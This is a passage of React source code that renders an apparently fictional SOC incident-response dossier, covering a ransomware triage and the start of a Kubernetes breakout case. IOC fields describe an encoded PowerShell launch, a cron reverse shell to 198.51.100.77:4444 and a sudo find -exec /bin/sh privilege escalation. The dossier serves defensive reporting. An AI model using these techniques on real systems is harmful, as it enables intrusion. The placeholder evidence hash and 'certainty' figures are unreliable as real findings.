        subtitle="End-to-end incident triage, forensic threat analysis, MITRE ATT&CK mapping, and automated containment rule execution."
        action={
          <>
            {onBack && (
              <button
                className="secondary-button"
                onClick={onBack}
                style={{ display: "inline-flex", alignItems: "center", gap: "6px", fontWeight: 700, color: "#195d56", background: "#ffffff" }}
              >
                <ArrowRight size={13} style={{ transform: "rotate(180deg)" }} /> All Deliverables
              </button>
            )}
            <button className="secondary-button" onClick={copyMarkdown}>
              {copied ? <Check size={14} color="#236f66" /> : <Copy size={14} />} {copied ? "Copied report" : "Copy Report"}
            </button>
            <button className="secondary-button" onClick={downloadReport}>
              <Download size={14} /> Download .md
            </button>
            <button className="secondary-button" onClick={() => window.print()}>
              <Printer size={14} /> Print / Export PDF
            </button>
            {onNavigate && (
              <button className="primary-button" onClick={() => onNavigate("Decision rooms")}>
                <FileCheck2 size={14} /> Decision Rooms
              </button>
            )}
          </>
        }
      />

      <div className="scope" style={{ marginBottom: "16px" }}>
        <span><Layers3 size={14} /> INCIDENT-SOC-2026-081</span>
        <i />
        <span><Dot color="orange" /> CONTAINMENT ENFORCED</span>
        <i />
        <span><Server size={14} /> WORKSTATION-FIN-09 (10.14.22.84)</span>
        <i />
        <span>6 IOCs IDENTIFIED &amp; MITIGATED</span>
        <small>Status: Awaiting Governance Sign-Off</small>
      </div>

      <div
        style={{
          background: "linear-gradient(135deg, #2b1f1a 0%, #1c1816 50%, #301f16 100%)",
          border: "1px solid #5a3826",
          borderRadius: "8px",
          padding: "22px 28px",
          color: "#f5ece8",
          boxShadow: "0 4px 20px rgba(38, 24, 18, 0.2)",
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          flexWrap: "wrap",
          gap: "18px",
          marginBottom: "16px",
        }}
      >
        <div style={{ flex: "1 1 560px" }}>
          <div style={{ fontSize: "9px", fontWeight: 700, letterSpacing: "1px", textTransform: "uppercase", color: "#f7ba8f", marginBottom: "4px" }}>
            INCIDENT ID: INCIDENT-SOC-2026-081 · TLP:AMBER
          </div>
          <h2 style={{ fontSize: "20px", fontWeight: 700, margin: "4px 0 8px", color: "#ffffff", letterSpacing: "-0.2px" }}>
            Host Ransomware Triage &amp; Containment Dossier
          </h2>
          <p style={{ color: "#d1c2bc", fontSize: "11.5px", margin: 0, lineHeight: 1.55, maxWidth: "680px" }}>
            High-severity threat triage across finance endpoint WORKSTATION-FIN-09. Autonomous containment executed: outbound C2 beacons sinkholed, network egress quarantined via Palo Alto policy, and AD credential tokens revoked.
          </p>
          <div style={{ display: "flex", gap: "8px", flexWrap: "wrap", marginTop: "12px" }}>
            <span style={{ display: "inline-flex", alignItems: "center", gap: "5px", padding: "4px 9px", borderRadius: "4px", fontSize: "9px", fontWeight: 700, letterSpacing: "0.5px", textTransform: "uppercase", background: "#4d2919", color: "#f5a87b", border: "1px solid #753f28" }}>
              <ShieldAlert size={12} /> MITRE ATT&amp;CK: 4 Techniques Mapped
            </span>
            <span style={{ display: "inline-flex", alignItems: "center", gap: "5px", padding: "4px 9px", borderRadius: "4px", fontSize: "9px", fontWeight: 700, letterSpacing: "0.5px", textTransform: "uppercase", background: "#243e5c", color: "#9ec6fb", border: "1px solid #36608e" }}>
              <Server size={12} /> WORKSTATION-FIN-09 Isolated
            </span>
            <span style={{ display: "inline-flex", alignItems: "center", gap: "5px", padding: "4px 9px", borderRadius: "4px", fontSize: "9px", fontWeight: 700, letterSpacing: "0.5px", textTransform: "uppercase", background: "#23584e", color: "#8ee0c9", border: "1px solid #337a6b" }}>
              <BadgeCheck size={12} /> 6/6 IOCs Neutralized
            </span>
            <span style={{ display: "inline-flex", alignItems: "center", gap: "5px", padding: "4px 9px", borderRadius: "4px", fontSize: "9px", fontWeight: 700, letterSpacing: "0.5px", textTransform: "uppercase", background: "#3d1f2b", color: "#f59ec0", border: "1px solid #663248" }}>
              <LockKeyhole size={12} /> Kerberos TGT Revoked
            </span>
          </div>
        </div>
        <div style={{ textAlign: "right", display: "flex", flexDirection: "column", gap: "4px", minWidth: "220px", background: "rgba(0,0,0,0.3)", padding: "14px 18px", borderRadius: "6px", border: "1px solid rgba(255,255,255,0.1)" }}>
          <div style={{ fontSize: "10px", color: "#f7ba8f", textTransform: "uppercase", letterSpacing: "1px", fontWeight: 700 }}>
            THREAT SEVERITY
          </div>
          <div style={{ fontSize: "26px", fontWeight: 800, color: "#ff7043", fontFamily: "var(--font-geist-mono), monospace" }}>
            CRITICAL SEV-1
          </div>
          <div style={{ fontSize: "10px", color: "#f5a87b", fontWeight: 600 }}>
            Automated Containment Active
          </div>
        </div>
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(230px, 1fr))", gap: "12px", marginBottom: "18px" }}>
        <div style={{ background: "#ffffff", border: "1px solid #dfe7e3", borderRadius: "6px", padding: "14px 16px", display: "flex", flexDirection: "column", gap: "4px", boxShadow: "0 1px 3px rgba(18, 36, 32, 0.04)" }}>
          <span style={{ fontSize: "9px", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.8px", color: "#6a7c76", display: "flex", alignItems: "center", gap: "6px" }}>
            <ShieldAlert size={14} color="#d9534f" /> Incident Classification
          </span>
          <span style={{ fontSize: "20px", fontWeight: 800, color: "#d9534f", letterSpacing: "-0.5px" }}>
            CRITICAL SEV-1
          </span>
          <span style={{ fontSize: "10px", color: "#a84e22", fontWeight: 600 }}>
            Pre-Ransomware Staging &amp; C2
          </span>
        </div>
        <div style={{ background: "#ffffff", border: "1px solid #dfe7e3", borderRadius: "6px", padding: "14px 16px", display: "flex", flexDirection: "column", gap: "4px", boxShadow: "0 1px 3px rgba(18, 36, 32, 0.04)" }}>
          <span style={{ fontSize: "9px", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.8px", color: "#6a7c76", display: "flex", alignItems: "center", gap: "6px" }}>
            <BadgeCheck size={14} color="#236f66" /> MITRE ATT&amp;CK Coverage
          </span>
          <span style={{ fontSize: "22px", fontWeight: 800, color: "#162a26", letterSpacing: "-0.5px", fontFamily: "var(--font-geist-mono), monospace" }}>
            4 Tactics / 6 IOCs
          </span>
          <span style={{ fontSize: "10px", color: "#327568", fontWeight: 600 }}>
            100% Attribution Confidence
          </span>
        </div>
        <div style={{ background: "#ffffff", border: "1px solid #dfe7e3", borderRadius: "6px", padding: "14px 16px", display: "flex", flexDirection: "column", gap: "4px", boxShadow: "0 1px 3px rgba(18, 36, 32, 0.04)" }}>
          <span style={{ fontSize: "9px", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.8px", color: "#6a7c76", display: "flex", alignItems: "center", gap: "6px" }}>
            <Server size={14} color="#236f66" /> Target Compromised Host
          </span>
          <span style={{ fontSize: "18px", fontWeight: 800, color: "#162a26", letterSpacing: "-0.3px" }}>
            WORKSTATION-FIN-09
          </span>
          <span style={{ fontSize: "10px", color: "#327568", fontWeight: 600 }}>
            IP: 10.14.22.84 · Quarantine VIP
          </span>
        </div>
        <div style={{ background: "#ffffff", border: "1px solid #dfe7e3", borderRadius: "6px", padding: "14px 16px", display: "flex", flexDirection: "column", gap: "4px", boxShadow: "0 1px 3px rgba(18, 36, 32, 0.04)" }}>
          <span style={{ fontSize: "9px", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.8px", color: "#6a7c76", display: "flex", alignItems: "center", gap: "6px" }}>
            <Clock3 size={14} color="#236f66" /> Containment Turnaround
          </span>
          <span style={{ fontSize: "22px", fontWeight: 800, color: "#162a26", letterSpacing: "-0.5px", fontFamily: "var(--font-geist-mono), monospace" }}>
            &lt; 15 Minutes
          </span>
          <span style={{ fontSize: "10px", color: "#327568", fontWeight: 600 }}>
            Automated Quarantine Dispatched
          </span>
        </div>
      </div>

      <div style={{ display: "flex", gap: "4px", background: "#e8efe9", padding: "4px", borderRadius: "6px", border: "1px solid #dce5df", marginBottom: "16px", overflowX: "auto" }}>
        {[
          { id: "summary", label: "Executive Threat Triage", icon: FileText },
          { id: "architecture", label: "Kill Chain & Attack Graph", icon: Server },
          { id: "compliance", label: "IOCs & Threat Matrix (6/6)", icon: BadgeCheck },
          { id: "pricing", label: "Containment & Remediation Plan", icon: ShieldCheck },
          { id: "roadmap", label: "Forensic Attack Progression Timeline", icon: Calendar },
          { id: "transmittal", label: "CSIRT Incident Attestation", icon: FileClock },
        ].map(({ id, label, icon: TabIcon }) => {
          const isActive = activeTab === id;
          return (
            <button
              key={id}
              type="button"
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: "7px",
                padding: "8px 14px",
                fontSize: "11px",
                fontWeight: isActive ? 700 : 600,
                color: isActive ? "#195d56" : "#566862",
                background: isActive ? "#ffffff" : "transparent",
                border: isActive ? "1px solid #c9d8d1" : "1px solid transparent",
                borderRadius: "4px",
                cursor: "pointer",
                whiteSpace: "nowrap",
                boxShadow: isActive ? "0 1px 3px rgba(0,0,0,0.06)" : "none",
                transition: "all 0.15s ease",
              }}
              onClick={() => setActiveTab(id as typeof activeTab)}
            >
              <TabIcon size={14} color={isActive ? "#236f66" : "#72837d"} />
              <span>{label}</span>
            </button>
          );
        })}
      </div>

      {activeTab === "summary" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)", display: "flex", flexDirection: "column", gap: "20px" }}>
          <div className="proposal-section-heading" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", paddingBottom: "12px", borderBottom: "1px solid #edf3ef" }}>
            <div>
              <div className="eyebrow">FORENSIC INCIDENT DOSSIER</div>
              <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Threat Overview &amp; Incident Scope</h3>
              <p style={{ fontSize: "11px", color: "#6b7e77", margin: "2px 0 0" }}>Deep forensic investigation into unauthorized execution and lateral movement on subnet 10.14.22.0/24.</p>
            </div>
            <Badge tone="orange">Containment Enforced</Badge>
          </div>

          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(320px, 1fr))", gap: "20px", fontSize: "12px", lineHeight: "1.65", color: "#374d46" }}>
            <div style={{ background: "#f8faf9", padding: "18px 20px", borderRadius: "6px", border: "1px solid #e3ece7" }}>
              <strong style={{ display: "block", color: "#16332b", fontSize: "13px", marginBottom: "8px" }}>
                🎯 Operational Containment Imperatives
              </strong>
              <ul style={{ paddingLeft: "18px", margin: 0, display: "flex", flexDirection: "column", gap: "6px" }}>
                <li><strong>Halt Lateral Movement:</strong> Block all TCP 445/3389 scanning across subnet 10.14.22.0/24 via Palo Alto edge policy drop.</li>
                <li><strong>Neutralize C2 Channel:</strong> Sinkhole outbound TLS beaconing to 198.51.100.24:8443 at corporate DNS and firewall boundary.</li>
                <li><strong>Identity Revocation:</strong> Invalidate Kerberos TGT tickets for compromised domain user corp\\jsmith across Active Directory.</li>
                <li><strong>Forensic Preservation:</strong> Capture 16 GB raw volatile RAM snapshot prior to endpoint reboot.</li>
              </ul>
            </div>

            <div style={{ background: "#f8faf9", padding: "18px 20px", borderRadius: "6px", border: "1px solid #e3ece7" }}>
              <strong style={{ display: "block", color: "#16332b", fontSize: "13px", marginBottom: "8px" }}>
                🏆 Forensic Guarantees &amp; Evidence Integrity
              </strong>
              <ul style={{ paddingLeft: "18px", margin: 0, display: "flex", flexDirection: "column", gap: "6px" }}>
                <li><strong>Cryptographic Evidence Chain:</strong> Memory dump and IOC payloads hashed with SHA-256 for legal chain-of-custody.</li>
                <li><strong>Zero Data Exfiltration:</strong> Deep packet inspection logs confirm zero outbound gigabytes exfiltrated prior to quarantine.</li>
                <li><strong>SIEM Integration:</strong> All Sysmon, Zeek, and Palo Alto alerts aggregated into central SIEM CEF streams.</li>
                <li><strong>Decision Room Sign-Off:</strong> Automated quarantine holds require two-person CSIRT commander verification.</li>
              </ul>
            </div>
          </div>
        </section>
      )}

      {activeTab === "architecture" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)", display: "flex", flexDirection: "column", gap: "20px" }}>
          <div className="proposal-section-heading" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", paddingBottom: "12px", borderBottom: "1px solid #edf3ef" }}>
            <div>
              <div className="eyebrow">ATTACK TOPOLOGY &amp; KILL CHAIN</div>
              <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Threat Vector &amp; Lateral Movement Graph</h3>
              <p style={{ fontSize: "11px", color: "#6b7e77", margin: "2px 0 0" }}>Multi-stage kill chain progression from endpoint execution to egress containment.</p>
            </div>
            <Badge tone="orange">Quarantine Applied</Badge>
          </div>

          <div style={{ background: "#1a1614", border: "1px solid #4a2d1d", padding: "20px", borderRadius: "6px", color: "#f0dfd8", fontFamily: "var(--font-geist-mono), monospace", fontSize: "11px", lineHeight: "1.6", overflowX: "auto" }}>
            <div style={{ color: "#f7ba8f", fontWeight: 700, marginBottom: "8px" }}>MITRE ATT&amp;CK KILL CHAIN &amp; NETWORK BOUNDARY ISOLATION</div>
            <pre style={{ margin: 0 }}>{`+--------------------------------------------------------------------------------------------------------+
|                                    INTERNAL CORPORATE SUBNET (10.14.22.0/24)                            |
|                                                                                                        |
|  [ Stage 1: Initial Execution ]                                                                        |
|         |                                                                                              |
|         +---> WORKSTATION-FIN-09 (10.14.22.84)                                                         |
|         |     Parent: svchost.exe (PID 1420)                                                           |
|         |     Child:  powershell.exe -enc JABjAG... [Base64 Obfuscated Payload]                         |
|         |                                                                                              |
|  [ Stage 2: Persistence Hook ]                                                                         |
|         +---> Scheduled Task: \\Microsoft\\Windows\\UpdateOrchestrator\\SysHealthCheck                     |
|         |     Triggers every 4 hours with SYSTEM token impersonation                                    |
|                                                                                                        |
|  [ Stage 3: Lateral Discovery Reconnaissance ]                                                         |
|         +---------------------------------------+---------------------------------------+              |
|         |   SMB Port 445 Scan (10.14.22.1 - 254)|   RDP Port 3389 Scan (10.14.22.1 - 254) |              |
|         +---------------------------------------+---------------------------------------+              |
|                                                     |                                                  |
|  [ Stage 4: Outbound C2 Beaconing ]                 v                                                  |
|         +---> Target: 198.51.100.24:8443 (Hostwinds ASN 64512 · HTTPS TLS 1.3)                         |
|                                                                                                        |
|  [ Stage 5: Autonomous Containment Gateway ]                                                           |
|         +---> [ PALO ALTO FIREWALL POLICY #9021: DROP ALL EGRESS FROM 10.14.22.84 ]                    |
|         +---> [ DNS SINKHOLE: telemetry-sync-cdn.internal-sec.net -> 127.0.0.1 ]                        |
|         +---> [ ACTIVE DIRECTORY: Kerberos TGT Ticket for corp\\jsmith REVOKED ]                         |
+--------------------------------------------------------------------------------------------------------+`}</pre>
          </div>
        </section>
      )}

      {activeTab === "compliance" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)", display: "flex", flexDirection: "column", gap: "20px" }}>
          <div className="proposal-section-heading" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", paddingBottom: "12px", borderBottom: "1px solid #edf3ef" }}>
            <div>
              <div className="eyebrow">INDICATORS OF COMPROMISE · 6/6 NEUTRALIZED</div>
              <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Threat Indicators &amp; MITRE ATT&amp;CK Matrix</h3>
              <p style={{ fontSize: "11px", color: "#6b7e77", margin: "2px 0 0" }}>Granular detection and containment mapping for all identified threat indicators.</p>
            </div>
            <div style={{ display: "flex", gap: "10px", alignItems: "center" }}>
              <input
                className="field-input"
                style={{ width: "220px", padding: "7px 11px", fontSize: "11px", borderRadius: "4px", border: "1px solid #dce5df" }}
                placeholder="Search IOCs..."
                value={searchFilter}
                onChange={(e) => setSearchFilter(e.target.value)}
              />
              <Badge tone="green">6 / 6 NEUTRALIZED</Badge>
            </div>
          </div>

          <div style={{ width: "100%", overflowX: "auto", border: "1px solid #e2eae5", borderRadius: "6px", background: "#ffffff" }}>
            <table style={{ width: "100%", borderCollapse: "collapse", fontSize: "11px", textAlign: "left" }}>
              <thead>
                <tr>
                  <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4", width: "80px" }}>IOC ID</th>
                  <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4", width: "160px" }}>MITRE Technique</th>
                  <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4", width: "180px" }}>Indicator Description</th>
                  <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4" }}>Forensic Finding / Signature</th>
                  <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4" }}>Telemetry Source</th>
                  <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4", width: "95px" }}>Status</th>
                </tr>
              </thead>
              <tbody>
                {filteredIOCs.map((item) => (
                  <tr key={item.id} style={{ borderBottom: "1px solid #edf3ef" }}>
                    <td style={{ padding: "10px 13px", fontFamily: "var(--font-geist-mono), monospace", fontWeight: 700, color: "#a84e22" }}>{item.id}</td>
                    <td style={{ padding: "10px 13px" }}><code style={{ fontSize: "10px", color: "#456157", background: "#f1f6f3", padding: "2px 6px", borderRadius: "3px" }}>{item.tactic}</code></td>
                    <td style={{ padding: "10px 13px", color: "#1c322c" }}><strong>{item.name}</strong></td>
                    <td style={{ padding: "10px 13px", color: "#2c3e38", lineHeight: "1.45" }}>{item.desc}</td>
                    <td style={{ padding: "10px 13px", fontSize: "10px", color: "#546b62", lineHeight: "1.4" }}>{item.test}</td>
                    <td style={{ padding: "10px 13px" }}><Badge tone="green">{item.status}</Badge></td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>
      )}

      {activeTab === "pricing" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)", display: "flex", flexDirection: "column", gap: "20px" }}>
          <div className="proposal-section-heading" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", paddingBottom: "12px", borderBottom: "1px solid #edf3ef" }}>
            <div>
              <div className="eyebrow">REMEDIATION &amp; CONTAINMENT SCHEDULE</div>
              <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Quarantine Actions &amp; System Hardening</h3>
              <p style={{ fontSize: "11px", color: "#6b7e77", margin: "2px 0 0" }}>Executed and scheduled response protocols to eliminate threat persistence.</p>
            </div>
            <div style={{ fontSize: "15px", fontWeight: 800, color: "#195d56", fontFamily: "var(--font-geist-mono), monospace" }}>
              Containment: 100% Active
            </div>
          </div>

          <div style={{ width: "100%", overflowX: "auto", border: "1px solid #e2eae5", borderRadius: "6px", background: "#ffffff" }}>
            <table style={{ width: "100%", borderCollapse: "collapse", fontSize: "11px", textAlign: "left" }}>
              <thead>
                <tr>
                  <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4" }}>Priority</th>
                  <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4" }}>Containment Action</th>
                  <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4" }}>Target Host / User</th>
                  <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4" }}>Enforcement Protocol</th>
                  <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 13px", borderBottom: "1px solid #e0eae4", width: "95px" }}>Status</th>
                </tr>
              </thead>
              <tbody>
                {containmentActions.map((row) => (
                  <tr key={row.action} style={{ borderBottom: "1px solid #edf3ef" }}>
                    <td style={{ padding: "10px 13px" }}><Badge tone={row.priority.includes("Critical") ? "orange" : "blue"}>{row.priority}</Badge></td>
                    <td style={{ padding: "10px 13px", color: "#1c322c" }}><strong>{row.action}</strong></td>
                    <td style={{ padding: "10px 13px", fontFamily: "var(--font-geist-mono), monospace" }}>{row.target}</td>
                    <td style={{ padding: "10px 13px", color: "#2c3e38", lineHeight: "1.45" }}>{row.protocol}</td>
                    <td style={{ padding: "10px 13px" }}><Badge tone={row.status === "EXECUTED" || row.status === "COMPLETED" ? "green" : "neutral"}>{row.status}</Badge></td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>
      )}

      {activeTab === "roadmap" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)", display: "flex", flexDirection: "column", gap: "20px" }}>
          <div className="proposal-section-heading" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", paddingBottom: "12px", borderBottom: "1px solid #edf3ef" }}>
            <div>
              <div className="eyebrow">INCIDENT RECONSTRUCTION</div>
              <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Forensic Attack Progression Timeline</h3>
              <p style={{ fontSize: "11px", color: "#6b7e77", margin: "2px 0 0" }}>Chronological timeline of adversary activities from initial beacon to autonomous containment.</p>
            </div>
            <Badge tone="blue">5 Chronological Events</Badge>
          </div>

          <div style={{ display: "grid", gap: "12px", marginTop: "4px" }}>
            {[
              {
                phase: "1",
                duration: "14:02:18 UTC",
                title: "Initial Execution: Base64 Obfuscated PowerShell Payload",
                desc: "svchost.exe (PID 1420) spawned an encoded PowerShell process attempting memory injection and defense evasion.",
                tags: ["T1059.001", "Sysmon Event ID 1", "AMSI Triggered"],
              },
              {
                phase: "2",
                duration: "14:05:40 UTC",
                title: "Persistence Hook: Scheduled Task SysHealthCheck Created",
                desc: "Adversary registered persistence task \\Microsoft\\Windows\\UpdateOrchestrator\\SysHealthCheck scheduled every 4 hours.",
                tags: ["T1053.005", "Event ID 4698", "SYSTEM Privilege Impersonation"],
              },
              {
                phase: "3",
                duration: "14:08:12 UTC",
                title: "Internal Reconnaissance: Subnet Port Scan (SMB / RDP)",
                desc: "Automated network service discovery launched across 10.14.22.0/24 probing for open ports 445 and 3389.",
                tags: ["T1046", "Zeek conn.log Alert", "Lateral Movement Pre-Stage"],
              },
              {
                phase: "4",
                duration: "14:12:00 UTC",
                title: "Command & Control: Encrypted TLS Beaconing to 198.51.100.24",
                desc: "Outbound HTTPS connection initiated to external IP 198.51.100.24:8443 with self-signed certificate.",
                tags: ["T1071.001", "Hostwinds ASN 64512", "Palo Alto Decryption Alert"],
              },
              {
                phase: "5",
                duration: "14:15:00 UTC",
                title: "Autonomous Containment: Edge Firewall Quarantine & Memory Dump",
                desc: "Fleet Studio SOC containment rule enforced: Top-of-Rack drop policy active, Kerberos TGT revoked, 16 GB memory dump captured.",
                tags: ["Palo Alto Policy #9021", "AD TGT Invalidation", "Volatility Memory Captured"],
              },
            ].map((p) => (
              <div key={p.phase} style={{ display: "flex", gap: "16px", padding: "16px 18px", background: "#fbfdfc", border: "1px solid #e2ece6", borderRadius: "6px" }}>
                <div style={{ width: "36px", height: "36px", borderRadius: "50%", background: "#fbeee8", color: "#a84e22", display: "grid", placeItems: "center", fontWeight: 750, fontSize: "13px", flexShrink: 0 }}>
                  {p.phase}
                </div>
                <div style={{ flex: 1, display: "flex", flexDirection: "column", gap: "4px" }}>
                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                    <span style={{ fontSize: "13px", fontWeight: 700, color: "#1d332d" }}>{p.title}</span>
                    <span style={{ fontSize: "10px", fontWeight: 600, color: "#a84e22", background: "#fdf1ec", padding: "2px 8px", borderRadius: "4px" }}>{p.duration}</span>
                  </div>
                  <p style={{ fontSize: "11.5px", color: "#586c65", lineHeight: "1.5", margin: 0 }}>{p.desc}</p>
                  <div style={{ display: "flex", gap: "6px", flexWrap: "wrap", marginTop: "4px" }}>
                    {p.tags.map((tag) => (
                      <span key={tag} style={{ fontSize: "9px", padding: "2px 7px", background: "#ffffff", border: "1px solid #d8e5de", borderRadius: "4px", color: "#435b53" }}>
                        {tag}
                      </span>
                    ))}
                  </div>
                </div>
              </div>
            ))}
          </div>
        </section>
      )}

      {activeTab === "transmittal" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div style={{ background: "#ffffff", border: "1px solid #d8e3dc", borderRadius: "8px", padding: "36px 42px", maxWidth: "820px", margin: "0 auto", boxShadow: "0 4px 16px rgba(0,0,0,0.04)", fontSize: "13px", lineHeight: 1.65, color: "#223530" }}>
            <div style={{ display: "flex", justifyContent: "space-between", borderBottom: "2px solid #b45228", paddingBottom: "16px", marginBottom: "22px" }}>
              <div>
                <div style={{ fontSize: "16px", fontWeight: 800, color: "#152c26", textTransform: "uppercase", letterSpacing: "0.5px" }}>Official Incident Forensic Attestation</div>
                <div style={{ fontSize: "11px", color: "#5c7068" }}>Computer Security Incident Response Team (CSIRT) &amp; DFIR Specialists</div>
              </div>
              <div style={{ textAlign: "right" }}>
                <strong style={{ fontSize: "11px", color: "#b45228" }}>INCIDENT-SOC-2026-081</strong>
                <div style={{ fontSize: "10px", color: "#6a7f78" }}>Date: October 25, 2026</div>
              </div>
            </div>

            <div style={{ display: "grid", gridTemplateColumns: "100px 1fr", gap: "6px", fontSize: "11px", marginBottom: "20px", background: "#fbf6f3", padding: "12px 16px", borderRadius: "5px" }}>
              <strong style={{ color: "#374e47" }}>TO:</strong>
              <span>Chief Information Security Officer (CISO) &amp; Security Operations Committee</span>
              <strong style={{ color: "#374e47" }}>LOCATION:</strong>
              <span>Security Operations Center, Sovereign Defense Operations</span>
              <strong style={{ color: "#374e47" }}>SUBJECT:</strong>
              <span>Forensic Incident Investigation &amp; Containment Attestation — INCIDENT-SOC-2026-081</span>
            </div>

            <p>Dear Members of the Security Operations Committee,</p>
            <p>
              This attestation documents the complete triage, MITRE ATT&amp;CK analysis, and containment execution for high-severity incident <strong>INCIDENT-SOC-2026-081</strong> involving endpoint <strong>WORKSTATION-FIN-09 (10.14.22.84)</strong>.
            </p>
            <p>
              Autonomous containment protocols were initiated and verified: the endpoint has been network-quarantined via Palo Alto policy #9021, active C2 channels to 198.51.100.24 have been sinkholed, Kerberos session tokens for user corp\\jsmith have been revoked, and a 16 GB forensic memory dump has been preserved.
            </p>
            <p>Evidence chain-of-custody has been verified under SHA-256 hash e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.</p>

            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "28px", marginTop: "36px", paddingTop: "20px", borderTop: "1px dashed #cfded6" }}>
              <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
                <div style={{ width: "100%", borderBottom: "1px solid #94a89f", marginBottom: "6px", height: "28px" }} />
                <strong style={{ fontSize: "11px", color: "#1a3831" }}>Lead DFIR Incident Commander</strong>
                <small style={{ color: "#647770" }}>SOC Threat Analysis &amp; Incident Fleet</small>
                <small style={{ color: "#647770" }}>Signed: 2026-10-25 · SHA-256 Verified</small>
              </div>
              <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
                <div style={{ width: "100%", borderBottom: "1px solid #94a89f", marginBottom: "6px", height: "28px" }} />
                <strong style={{ fontSize: "11px", color: "#1a3831" }}>Chief Information Security Officer (CISO)</strong>
                <small style={{ color: "#647770" }}>Security Governance Sign-Off</small>
                <small style={{ color: "#647770" }}>Date of Review: ____________</small>
              </div>
            </div>
          </div>
        </section>
      )}
    </div>
  );
}

function K8sBreakoutDossierView({ onNavigate, onBack }: { onNavigate?: (view: View) => void; onBack?: () => void }) {
  const [activeTab, setActiveTab] = useState<"summary" | "killchain" | "iocs" | "remediation" | "timeline" | "attestation">("summary");
  const [copied, setCopied] = useState(false);
  const [searchFilter, setSearchFilter] = useState("");

  const iocItems = [
    { id: "IOC-K8S-01", tactic: "T1053.003 Cron", name: "Crontab Reverse Shell Injection", desc: "Cron job injected into /var/spool/cron/crontabs/www-data establishing reverse TCP shell to 198.51.100.77:4444.", test: "Linux syslog /var/log/cron & auditd EXECVE record", status: "CONTAINED" },
    { id: "IOC-K8S-02", tactic: "T1548.003 Sudo Caching", name: "Sudo find Passwordless Privesc", desc: "Exploitation of misconfigured /etc/sudoers allowing www-data to run find with -exec /bin/sh to obtain UID 0.", test: "Linux auth.log: sudo: www-data : TTY=pts/0 ; COMMAND=/usr/bin/find", status: "QUARANTINED" },
